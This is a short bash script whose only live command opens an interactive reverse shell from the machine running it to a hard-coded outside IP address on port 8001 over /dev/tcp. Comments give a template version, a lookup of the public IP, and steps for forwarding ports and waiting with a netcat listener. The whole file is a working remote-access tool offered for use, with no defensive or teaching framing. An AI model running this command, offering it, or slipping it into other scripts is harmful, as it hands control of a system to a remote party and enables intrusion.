#!/bin/bash

# ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
# bash -i >& /dev/tcp/youripaddress/8001 0>&1

bash -i >& /dev/tcp/148.3.88.17/8001 0>&1

# INSTRUCTIONS:
# 1. Open port 8001-8079 on your router and forward it to your device's local IP on the same port
# 2. Listen on your computer using NetCat running:
#    nc -lvv 0.0.0.0 -p 8001 (Android)
#    nc -nlvv -p 8002 (Server)
